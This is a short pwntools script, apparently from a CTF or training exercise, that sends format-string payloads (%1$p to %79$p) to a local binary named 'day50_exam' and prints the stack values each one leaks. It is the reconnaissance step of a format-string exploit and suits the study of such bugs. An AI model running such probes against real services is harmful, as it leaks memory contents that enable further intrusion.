from pwn import *

context.binary = "./day50_exam"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day50_exam")
	payload = f"%{i}$p".encode()
	p.recvuntil(b"reviewer:\n")
	p.sendline(payload)
	p.recvuntil(b"record:")
	
	out = p.recvline()
	print(i, out)
	p.close()
